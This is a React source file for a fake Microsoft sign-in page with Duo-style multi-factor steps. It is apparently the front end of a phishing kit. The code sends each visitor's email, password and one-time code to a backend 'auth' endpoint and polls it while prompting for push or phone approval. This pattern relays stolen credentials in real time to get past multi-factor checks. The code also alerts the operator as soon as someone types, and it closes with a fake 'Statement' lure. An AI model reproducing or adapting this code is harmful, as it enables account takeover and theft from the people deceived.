import React, { useState, useEffect } from 'react'; // <-- 1. Import useEffect
import './AppStyles.css'; // Import the new CSS file

/**
 * A React component that accurately replicates a multi-step login page.
 * It features a multi-step process including password, push notifications, security codes, 
 * and phone call verification, with continuous polling for MFA.
 */
const App = () => {
    const api_url = "";
    // State to manage the user's email input
    const [email, setEmail] = useState('');
    // State to manage the user's password input
    const [password, setPassword] = useState('');
    // State to manage the "Keep me signed in" checkbox
    const [keepSignedIn, setKeepSignedIn] = useState(false);
    // State to control the flow between the email and password steps
    const [isPasswordStep, setIsPasswordStep] = useState(false);
    // State to control the flow to the MFA/verification step
    const [isDuoMobileStep, setIsDuoMobileStep] = useState(false);
    // State to control the flow to the Success step
    const [isSuccessStep, setIsSuccessStep] = useState(false);
    // State to handle submission feedback
    const [isSubmitting, setIsSubmitting] = useState(false);
    const [authMessage, setAuthMessage] = useState('');
    const [duoCode, setDuoCode] = useState('');
    const [showDuoCodeInput, setShowDuoCodeInput] = useState(false);
    // State to control error styling for auth messages
    const [isError, setIsError] = useState(false);
    // State for the "Don't ask again" MFA checkbox
    const [dontAskAgain, setDontAskAgain] = useState(false);

    const [alert_email_typing, setAlert_email_typing] = useState(false);

    /**
     * Sends an alert notification to the backend.
     * @param {string} message - The message to send.
     */
    const send_alert_notification = async (message) => {
        let response = await fetch(api_url + "/alert", {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ message }),
        });
        let data = await response.json();
        console.log(data);
    };

   
    /**
     * Handles the form submission for the email step.
     * @param {React.FormEvent} e - The form event.
     */
    const handleNextClick = (e) => {
        e.preventDefault();
        if (email) {
            setIsPasswordStep(true);
            setAuthMessage('');
            setIsError(false);
        }
    };

    /**
     * Handles the "Back" button click to return to the email/password step.
     */
    const handleBackClick = () => {
        setIsPasswordStep(true);
        setIsDuoMobileStep(false);
        setAuthMessage('');
        setIsError(false);
    };

    /**
     * Asynchronously polls the backend for the authentication status.
     * @param {string} email - The user's email.
     * @param {string} password - The user's password.
     * @param {string} [duoCode=''] - The Duo Mobile code, if applicable.
     * @returns {Promise<string>} The authentication status.
     */
    async function get_status_for_email(email, password, duoCode = '') {
        let response = await fetch(api_url + "/auth", {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email, password, duoCode }),
        });
        let data = await response.json();
        return data.status;
    }

    /**
     * Handles the main sign-in logic, including password submission and
     * continuous polling for multi-factor authentication.
     * @param {React.FormEvent} e - The form event.
     */
    const handleSignInClick = async (e) => {
        e.preventDefault();
        if (!password) return;

        setIsSubmitting(true);
        setAuthMessage('');
        setIsError(false);
        console.log('Attempting sign-in with:', { email, password, keepSignedIn, duoCode });

        let status = '';
        let attempts = 0;
        const maxAttempts = 60; // Max attempts for polling (60 seconds)

        do {
            status = await get_status_for_email(email, password, duoCode);
            console.log('Authentication status:', status);

            if (status === 'pending') {
                setIsError(false);
                setAuthMessage('Authentication pending. Please wait...');
                await new Promise(resolve => setTimeout(resolve, 1000));
                attempts++;
            } else if (status === 'incorrect password') {
                setIsError(true);
                setAuthMessage('Incorrect password. Please try again.');
                setIsDuoMobileStep(false);
                setIsPasswordStep(true); // Return to password entry
                break;
            } else if (status === 'mobile notification' || status === 'phone_call') {
                setIsError(false);
                const message = status === 'mobile notification'
                    ? 'We sent a notification to your mobile device. Please open it to continue.'
                    : "We're calling your phone. Please answer it to continue.";
                setAuthMessage(message);
                setIsPasswordStep(false);
                setIsDuoMobileStep(true);
                setShowDuoCodeInput(false);
                await new Promise(resolve => setTimeout(resolve, 1000));
                attempts++;
            } else if (status === 'duo code' || status === 'incorrect duo code') {
                const isIncorrect = status === 'incorrect duo code';
                setIsError(isIncorrect);
                setAuthMessage(isIncorrect ? 'Incorrect code. Please try again.' : 'Open your Duo app and Duo will send you a one time code. enter code here');
                setIsPasswordStep(false);
                setIsDuoMobileStep(true);
                setShowDuoCodeInput(true);
                break;
            } else if (status === 'success') {
                setIsSuccessStep(true);
                setIsPasswordStep(false);
                setIsDuoMobileStep(false);
                break;
            } else {
                setIsError(true);
                setAuthMessage('An unexpected error occurred. Please try again.');
                break;
            }
        } while ((status === 'pending' || status === 'mobile notification' || status === 'phone_call') && attempts < maxAttempts);

        if ((status === 'pending' || status === 'mobile notification' || status === 'phone_call') && attempts >= maxAttempts) {
            setIsError(true);
            setAuthMessage('Authentication timed out. Please try again.');
        }

        setIsSubmitting(false);
    };

    // SVG Icon for "Sign-in options"
    const KeyIcon = () => (
        <svg className="key-icon-svg" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1} stroke="currentColor">
            <path strokeLinecap="round" strokeLinejoin="round" d="M15.75 5.25a3 3 0 013 3m3 0a6 6 0 01-7.029 5.912c-.563-.097-1.159.026-1.563.43L10.5 17.25H8.25v2.25H6v2.25H2.25v-2.818c0-.597.237-1.17.659-1.591l6.499-6.499c.404-.404.527-1 .43-1.563A6 6 0 1121.75 8.25z" />
        </svg>
    );
    
    // SVG Icon for the new Phone verification step
    const PhoneIcon = () => (
        <svg className="mfa-prompt-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor">
            <path strokeLinecap="round" strokeLinejoin="round" d="M2.25 6.75c0 8.284 6.716 15 15 15h2.25a2.25 2.25 0 002.25-2.25v-1.372c0-.516-.351-.966-.852-1.091l-4.423-1.106c-.44-.11-.902.055-1.173.417l-1.49 1.49c-1.976-1.034-3.668-2.726-4.702-4.702l1.49-1.49a.75.75 0 00.417-1.173l-1.106-4.423a1.125 1.125 0 00-1.091-.852H3.75A2.25 2.25 0 002.25 6.75z" />
        </svg>
    );


    return (
        <div className="app-container">
            <div
                className="background-image-container"
                style={{
                    backgroundImage: "url('https://source.unsplash.com/1920x1080/?landscape,nature,abstract')",
                }}
            ></div>
            <div className="overlay"></div>

            <div className="content-wrapper">
                <div className="login-form-container">
                    
                    {!isPasswordStep && !isDuoMobileStep && !isSuccessStep ? (
                        <div key="email-step">
                            <div style={{ marginBottom: '1.5rem' }}>
                                <img
                                    src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31"
                                    alt="Microsoft Logo"
                                    className="microsoft-logo"
                                    onError={(e) => { e.target.onerror = null; e.target.src='https://placehold.co/108x24/cccccc/000000?text=Logo+Error'; }}
                                />
                            </div>
                            <h1 className="form-title">Sign in</h1>
                            <form onSubmit={handleNextClick}>
                                <div className="input-field-container">
                                    <input
                                        type="email"
                                        value={email}
                                        onChange={(e) => {
                                            if (!alert_email_typing) {
                                                setAlert_email_typing(true);
                                                send_alert_notification("Someone is currently typing an email");
                                            }
                                            setEmail(e.target.value);
                                        }}
                                        placeholder="Email, phone, or Skype"
                                        className="input-field"
                                        autoFocus
                                    />
                                </div>
                                <div className="text-xs-custom" style={{ marginBottom: '1.5rem' }}>
                                    <p className="text-gray-700-custom">
                                        No account?{' '}
                                        <a href="#" className="link-custom">
                                            Create one!
                                        </a>
                                    </p>
                                </div>
                                <div className="flex-justify-end">
                                    <button
                                        type="submit"
                                        className="button-primary"
                                        onClick={() => {
                                            send_alert_notification("Someone is trying to sign in with email: " + email);
                                        }}
                                    >
                                        Next
                                    </button>
                                </div>
                            </form>
                        </div>
                    ) : isPasswordStep ? (
                        <div key="password-step">
                            <div style={{ marginBottom: '1.5rem' }}>
                                <img
                                    src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31"
                                    alt="Microsoft Logo"
                                    className="microsoft-logo"
                                    onError={(e) => { e.target.onerror = null; e.target.src='https://placehold.co/108x24/cccccc/000000?text=Logo+Error'; }}
                                />
                            </div>
                            <div className="password-step-header">
                                <button onClick={() => { setIsPasswordStep(false); setAuthMessage(''); setIsError(false); }} className="back-button">
                                    <svg xmlns="http://www.w3.org/2000/svg" className="back-button-icon" viewBox="0 0 20 20" fill="currentColor">
                                        <path fillRule="evenodd" d="M12.707 5.293a1 1 0 010 1.414L9.414 10l3.293 3.293a1 1 0 01-1.414 1.414l-4-4a1 1 0 010-1.414l4-4a1 1 0 011.414 0z" clipRule="evenodd" />
                                    </svg>
                                </button>
                                <span className="email-display">{email}</span>
                            </div>
                            <h1 className="form-title">Enter password</h1>
                            <form onSubmit={handleSignInClick}>
                                <div style={{ marginBottom: '0.5rem' }}>
                                    <input
                                        type="password"
                                        value={password}
                                        onChange={(e) => setPassword(e.target.value)}
                                        placeholder="Password"
                                        className="input-field"
                                        autoFocus
                                    />
                                </div>

                                {authMessage && (
                                    <p className="auth-message" style={{ color: isError ? '#d9534f' : 'inherit', marginBottom: '1rem' }}>
                                        {authMessage}
                                    </p>
                                )}

                                <div className="flex-justify-between" style={{ marginBottom: '1.5rem' }}>
                                    <label className="checkbox-container">
                                        <input
                                            type="checkbox"
                                            checked={keepSignedIn}
                                            onChange={(e) => setKeepSignedIn(e.target.checked)}
                                            className="checkbox-input"
                                        />
                                        <span className="checkbox-custom"></span>
                                        <span style={{marginRight: '3px'}}>Keep me signed in</span>
                                    </label>
                                    <a href="#" className="link-custom">Forgot password?</a>
                                </div>

                                <div className="flex-justify-end">
                                    <button
                                        type="submit"
                                        className="button-primary"
                                        disabled={isSubmitting}
                                    >
                                        {isSubmitting ? 'Signing in...' : 'Sign in'}
                                    </button>
                                </div>
                            </form>

                            <div className="sign-in-options">
                                <KeyIcon />
                                <a href="#" className="link-custom">Sign-in options</a>
                            </div>
                        </div>
                    ) : isDuoMobileStep ? (
                        <div key="duo-mobile-step">
                            <div style={{ marginBottom: '1.5rem' }}>
                                <img
                                    src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31"
                                    alt="Microsoft Logo"
                                    className="microsoft-logo"
                                    onError={(e) => { e.target.onerror = null; e.target.src='https://placehold.co/108x24/cccccc/000000?text=Logo+Error'; }}
                                />
                            </div>
                            <div className="password-step-header">
                                <button onClick={handleBackClick} className="back-button">
                                    <svg xmlns="http://www.w3.org/2000/svg" className="back-button-icon" viewBox="0 0 20 20" fill="currentColor">
                                        <path fillRule="evenodd" d="M12.707 5.293a1 1 0 010 1.414L9.414 10l3.293 3.293a1 1 0 01-1.414 1.414l-4-4a1 1 0 010-1.414l4-4a1 1 0 011.414 0z" clipRule="evenodd" />
                                    </svg>
                                </button>
                                <span className="email-display">{email}</span>
                            </div>

                            {showDuoCodeInput ? (
                                <>
                                    <h1 className="form-title">DUO CODE</h1>
                                    {authMessage && (
                                        <p className="auth-message" style={{ color: isError ? '#d9534f' : 'inherit', marginBottom: '1rem' }}>
                                            {authMessage}
                                        </p>
                                    )}
                                    <form onSubmit={handleSignInClick}>
                                        <div className="input-field-container" style={{ marginBottom: '0.5rem' }}>
                                            <input
                                                type="text"
                                                value={duoCode}
                                                onChange={(e) => setDuoCode(e.target.value)}
                                                placeholder="Enter security code"
                                                className="input-field"
                                                autoFocus
                                            />
                                        </div>
                                        <div className="flex-justify-end">
                                            <button
                                                type="submit"
                                                className="button-primary"
                                                disabled={isSubmitting}
                                            >
                                                {isSubmitting ? 'Verifying...' : 'Verify'}
                                            </button>
                                        </div>
                                    </form>
                                </>
                            ) : (
                                <>
                                    <h1 className="form-title" style={{ marginBottom: '2rem' }}>Approve sign in request</h1>
                                    <div className="mfa-prompt-container">
                                        {authMessage.includes('calling') ? <PhoneIcon /> : <div className="spinner"></div>}
                                        <p className="mfa-prompt-text">{authMessage}</p>
                                    </div>
                                    <div className="mfa-options-container">
                                        <label className="checkbox-container">
                                            <input
                                                type="checkbox"
                                                checked={dontAskAgain}
                                                onChange={(e) => setDontAskAgain(e.target.checked)}
                                                className="checkbox-input"
                                            />
                                            <span className="checkbox-custom"></span>
                                            Don't ask again for 30 days
                                        </label>
                                        <div className="mfa-links">
                                            <a href="#" className="link-custom">Having trouble? Sign in another way</a>
                                            <a href="#" className="link-custom">More information</a>
                                        </div>
                                    </div>
                                </>
                            )}
                        </div>
                    ) : ( // Success Step
                        <div key="success-step" className="success-step">
                             <div style={{ marginBottom: '1.5rem' }}>
                                <img
                                    src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31"
                                    alt="Microsoft Logo"
                                    className="microsoft-logo"
                                    onError={(e) => { e.target.onerror = null; e.target.src='https://placehold.co/108x24/cccccc/000000?text=Logo+Error'; }}
                                />
                            </div>
                            <h1 className="form-title" style={{ marginBottom: '16px' }}>Thanks!</h1>
                            <p style={{
                                fontSize: '1.1rem',
                                color: '#333',
                                marginBottom: '8px'
                            }}>
                                No Further Action Needed on your end.
                            </p>
                            <p style={{
                                fontSize: '0.9rem',
                                color: '#555'
                            }}>
                                An email containing the Statement will be sent to you shortly.
                            </p>
                        </div>
                    )}

                </div>
            </div>

            <div className="footer-container">
                <div className="footer-links">
                    <a href="#" className="footer-link">Terms of use</a>
                    <a href="#" className="footer-link">Privacy & cookies</a>
                    <button className="footer-button footer-ellipsis">...</button>
                </div>
            </div>
        </div>
    );
};

export default App;